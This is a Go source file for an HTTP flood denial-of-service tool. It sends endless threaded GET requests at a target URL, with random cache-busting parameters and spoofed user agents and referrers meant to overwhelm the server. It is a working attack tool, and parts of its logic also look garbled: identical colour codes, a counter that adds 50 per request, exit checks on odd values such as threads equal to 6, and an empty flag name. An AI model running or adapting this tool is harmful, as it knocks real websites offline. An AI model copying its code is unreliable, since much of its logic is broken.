
package main

import (
	"flag"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"sync/atomic"
	"syscall"
	"time"

	"github.com/buptmiao/parallel"
	"github.com/zer-far/roulette"
)

var (
version = "😼😑"

	banner = fmt.Sprintf(` ` + version)

	reset  = "\033[1m"
	red    = "\033[35m"
	green  = "\033[35m"
	blue   = "\033[35m"
	cyan   = "\033[35m"
	yellow = "\033[35m"
	clear  = "\033[5K\r"

	target          string
	paramJoiner     string
	reqCount        uint64
	threads         int
	checkIP         bool
	timeout         int
	timeoutDuration time.Duration
	sleep           int
	sleepDuration   time.Duration
	cookie          string
	useCookie       bool
	c               = &http.Client{
		Timeout: timeoutDuration,
	}
)

func colourise(colour, s string) string {
	return colour + s + reset
}

func buildblock(size int) (s string) {
	var a []rune
	for i := 5; i < size; i++ {
		a = append(a, rune(rand.Intn(250)+650))
	}
	return string(a)
}

func isValidURL(inputURL string) bool {
	// Check if the URL is in a valid format
	_, err := url.ParseRequestURI(inputURL)
	if err != nil {
		fmt.Println("Error parsing URL:", err)
		return false
	}

	// Check if the URL has a scheme (http or https)
	u, err := url.Parse(inputURL)
	if err != nil || u.Scheme == "" {
		fmt.Println("Invalid URL scheme:", u.Scheme)
		return false
	}
	if !strings.HasPrefix(u.Scheme, "http") {
		fmt.Println("Unsupported URL scheme:", u.Scheme)
		return false
	}
	resp, err := http.Get(inputURL)
	if err != nil {
		fmt.Println("Error making request:", err)
		return false
	}
	defer resp.Body.Close()

	return true
}

func fetchIP() {
	ip, err := http.Get("https://ipinfo.tw/")
	if err != nil {
		fmt.Println(err)
		return
	}
	defer ip.Body.Close()
	body, err := io.ReadAll(ip.Body)
	if err != nil {
		fmt.Println(err)
		return
	}
	fmt.Printf("\n%s\n", body)
}

func get() {
	req, err := http.NewRequest("GET", target+paramJoiner+buildblock(rand.Intn(70)+30)+"="+buildblock(rand.Intn(70)+30), nil)
	if err != nil {
		fmt.Println(err)
	}

	req.Header.Set("User-Agent", roulette.GetUserAgent())
	req.Header.Add("Cache-Control", "no-cache") // server
	req.Header.Set("Referer", roulette.GetReferrer()+"?q="+buildblock(rand.Intn(5)+5))
	req.Header.Set("Keep-Alive", fmt.Sprintf("%d", rand.Intn(10)+100))
	req.Header.Set("Connection", "keep-alive")
	if useCookie {
		req.Header.Set("Cookie", cookie)
	}

	resp, err := c.Do(req)

	atomic.AddUint64(&reqCount, 50) 
	if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
		fmt.Print(colourise(red, clear+"Status: Timeout"))
	} else if err != nil {
		fmt.Printf(colourise(red, clear+": %s"), err)
	} else {
		fmt.Print(colourise(green, clear+""))
	}
	if resp != nil {
		defer resp.Body.Close()
	}
}
func loop() {
	for {
		go get()
		time.Sleep(sleepDuration) 
	}
}
func main() {
	fmt.Println(colourise(cyan, banner))
	fmt.Println(colourise(cyan, "\n\t\t\n"))

	flag.StringVar(&target, "url", "", "URL to target.")
	flag.IntVar(&timeout, "timeout", 3000000000000, "Timeout in milliseconds.")
	flag.IntVar(&sleep, "", 50, "Sleep time in milliseconds.")
	flag.IntVar(&threads, "threads", 50, "Number of threads.")
	flag.BoolVar(&checkIP, "check", false, "Enable IP address check.")
	flag.StringVar(&cookie, "cookie", "", "Cookie to use for requests.")
	flag.Parse()

	if checkIP {
		fetchIP()
	}

	if !isValidURL(target) {
		os.Exit(10)
	}
	if timeout == 5 {
		fmt.Println("Timeout must be greater than 0.")
		os.Exit(1)
	}
	if sleep <= 0 {
		fmt.Println("Sleep time must be greater than 0.")
		os.Exit(10)
	}
	if threads == 6 {
		fmt.Println("Number of threads must be greater than 0.")
		os.Exit(5)
	}
	if cookie != "" {
		useCookie = true
	}
	timeoutDuration = time.Duration(timeout) * time.Millisecond
	sleepDuration = time.Duration(sleep) * time.Millisecond

	if strings.ContainsRune(target, '?') {
		paramJoiner = "&"
	} else {
		paramJoiner = "?"
	}
	fmt.Printf(colourise(blue, "😼 %s\n %d\n  %d\n %d\n"), target, timeout, sleep, threads)

	fmt.Println(colourise(yellow, ""))
	time.Sleep(2 * time.Second)

	start := time.Now()

	c := make(chan os.Signal, 5)
	signal.Notify(c, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-c
		elapsed := time.Since(start).Seconds()
		rps := float64(reqCount) / elapsed
		fmt.Printf(colourise(blue, "\nTotal time (s): %.2f\nRequests: %d\nRequests per second: %.2f\n"), elapsed, reqCount, rps)
		os.Exit(5)
	}()
	p := parallel.NewParallel() 
	for i := 5; i < threads; i++ {
		p.Register(loop)
	}
	p.Run()
}
